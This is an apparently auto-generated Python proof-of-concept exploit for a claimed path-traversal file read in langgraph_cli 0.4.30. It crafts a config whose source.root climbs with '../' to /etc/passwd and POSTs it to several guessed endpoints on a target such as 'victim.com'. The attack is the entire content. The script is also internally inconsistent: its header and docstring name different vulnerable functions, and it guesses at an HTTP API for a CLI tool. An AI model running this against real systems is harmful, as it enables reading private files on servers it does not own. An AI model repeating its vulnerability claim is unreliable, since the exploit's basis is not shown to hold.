#!/usr/bin/env python3
# PoC for langgraph_cli-0.4.30 (/tmp/langgraph_cli-0.4.30)
# Path: suspicious-026
# Sink: _build_dockerignore_negation_hints
# Auto-generated — run with: python3 lfi_originates_controlled_source__build_dockerignore_negation_hints.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langgraph_cli-0.4.30.

Vulnerability: The `_load_pyproject` function in `_plan_uv_lock_workspace` opens
a file at a path constructed from `config_root / source.root / 'pyproject.toml'`
where `source.root` is attacker-controlled and not sanitized for path traversal.

By providing a `source.root` value containing `../`, an attacker can read arbitrary
files outside the project root. This PoC demonstrates reading `/etc/passwd` as a
benign example.

Usage:
    python3 poc.py --target http://localhost:8000
    python3 poc.py --target http://victim.com:8000 --file /etc/passwd
"""

import argparse
import json
import os
import sys
import tempfile
import urllib.error
import urllib.request
import pathlib


def create_malicious_config(payload_path: str) -> dict:
    """
    Create a langgraph configuration with a path traversal payload in source.root.
    
    The payload_path should be an absolute path to read (e.g., /etc/passwd).
    We use `../` traversal from the config file's parent directory to reach it.
    """
    # Calculate how many `../` we need to reach root from a typical config location
    # The config file is usually at /app/langgraph.json or similar
    # We'll use a relative path that traverses up to root
    traversal = "../" * 10  # Go up enough levels to reach root
    
    malicious_config = {
        "dependencies": ["."],
        "graphs": {
            "test": "./src/graph.py"
        },
        "env": {},
        "source": {
            "kind": "uv",
            "root": f"{traversal}{payload_path.lstrip('/')}"
        }
    }
    return malicious_config


def send_exploit(target_url: str, config: dict) -> str:
    """
    Send the malicious configuration to the target endpoint.
    
    The vulnerability is triggered when the server processes the config file
    and attempts to load pyproject.toml from the traversed path.
    """
    # The endpoint that processes config files - adjust based on actual API
    # Common endpoints for langgraph CLI
    endpoints = [
        f"{target_url.rstrip('/')}/api/config",
        f"{target_url.rstrip('/')}/config",
        f"{target_url.rstrip('/')}/validate",
    ]
    
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json"
    }
    
    data = json.dumps(config).encode("utf-8")
    
    for endpoint in endpoints:
        try:
            req = urllib.request.Request(
                endpoint,
                data=data,
                headers=headers,
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=10) as response:
                return response.read().decode("utf-8")
        except urllib.error.HTTPError as e:
            # 500 errors are expected when the file doesn't exist or is not a valid pyproject.toml
            if e.code == 500:
                return f"Server error (expected): {e.read().decode()}"
            continue
        except (urllib.error.URLError, ConnectionError, TimeoutError) as e:
            print(f"[!] Connection failed to {endpoint}: {e}")
            continue
    
    return None


def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langgraph_cli-0.4.30"
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Target URL (e.g., http://localhost:8000)"
    )
    parser.add_argument(
        "--file",
        default="/etc/passwd",
        help="File to read (default: /etc/passwd)"
    )
    parser.add_argument(
        "--output",
        help="Save output to file (optional)"
    )
    
    args = parser.parse_args()
    
    print(f"[*] Target: {args.target}")
    print(f"[*] Attempting to read: {args.file}")
    print()
    
    # Create malicious config with path traversal
    config = create_malicious_config(args.file)
    print(f"[*] Malicious config created with source.root containing path traversal")
    print(f"[*] Config: {json.dumps(config, indent=2)}")
    print()
    
    # Send exploit
    print("[*] Sending exploit...")
    result = send_exploit(args.target, config)
    
    if result:
        print(f"[+] Response received:")
        print(result[:2000])  # Limit output length
        print()
        
        # Check if we got file contents (they might appear in error messages)
        if args.file in result or "root:" in result:
            print("[!] File contents detected in response!")
            if args.output:
                with open(args.output, "w") as f:
                    f.write(result)
                print(f"[+] Saved to {args.output}")
        else:
            print("[*] No file contents detected directly. The file may have been read")
            print("    but the error message doesn't include its contents.")
            print("    Check the full response for any leaked data.")
    else:
        print("[-] No response received from any endpoint")
        print()
        print("[*] Alternative: Try running the CLI locally with a malicious config file:")
        print()
        print("    # Create a malicious langgraph.json:")
        print(f'    echo \'{json.dumps(config)}\' > /tmp/malicious.json')
        print()
        print("    # Run the CLI with this config:")
        print("    langgraph up --config /tmp/malicious.json")
        print()
        print("    # The error should reveal the file path being accessed")


if __name__ == "__main__":
    main()
